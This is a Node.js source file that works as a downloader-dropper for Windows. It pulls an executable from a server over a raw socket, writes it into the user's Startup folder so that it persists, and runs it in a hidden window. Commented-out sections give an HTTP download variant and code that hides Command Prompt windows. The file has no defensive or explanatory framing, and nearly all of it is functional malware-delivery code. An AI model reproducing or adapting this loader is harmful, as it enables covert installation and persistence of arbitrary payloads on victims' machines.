const path = require('path');
const os = require('os');
const fs = require('fs');
const net = require('net');
const { exec } = require('child_process');

const serverADD = '127.0.0.1';
const serverPORT = 8080;
const fileName = 'clienttest.exe';
const hostPath = path.resolve(os.homedir(), 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup');
//C:\Users\Snow\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


const dest = path.resolve(hostPath, fileName);
const writeStream = fs.createWriteStream(dest);


writeStream.on('close', () => {
	exec(`cd ${hostPath} && start /B ${fileName}`, {
		windowsHide: true,
		shell:true
	});

	setTimeout(() => process.exit(1), 1000);
})

const downloadConnection = net.createConnection({port: serverPORT, host: serverADD}, () => {

	downloadConnection.write('testingAuth');

	setTimeout(() => {
		downloadConnection.write('commence download', () => {
			downloadConnection.pipe(writeStream);
		});
	},200)

	
	downloadConnection.on('connect', () => {
		console.log('we are connected')
		//downloadConnection.pipe(writeStream);
	})
	
	downloadConnection.on('data', (data) => {
		console.log(data);
	})
	
	downloadConnection.on('end', () => {
		//console.log('ending')
		//writeStream.close();
	})
	
	
	downloadConnection.on('error', () => {
		console.log(err)
		//downloadConnection.write('Failed to download .exe.');
		//downloadConnection.destroy();
	})
})


// function executeDownloader() {
// 	const dest = path.resolve(os.homedir(), '.clienttest.exe');
// 	const ws = fs.createWriteStream(dest);
// 	const request = http.get(url, (response) => {
// 		response.pipe(ws);
// 	})

// 	request.on('error', (err) => {
// 		console.log(err);
// 		fs.unlink(dest);
// 	})

// 	ws.on('finish', () => {
// 		ws.close(cb)
// 	})
// }

// executeDownloader();

// const hide = require('node-hide');


// hide.visableWindows(function(data) {
// 	let windows = data;

// 	let hideThese = [];
	
// 	for (key in windows) {
// 		if (windows[key].indexOf('Command Prompt') !== -1) {
// 			console.log(`Key is: ${key} prop is: ${windows[key]}`)
// 			hideThese.push(key);
// 		}
// 	}

// 	hide.hideWindow(hideThese);

// 	setTimeout(() => {
// 		hide.closeWindow(hideThese);
// 	},2000)

// })
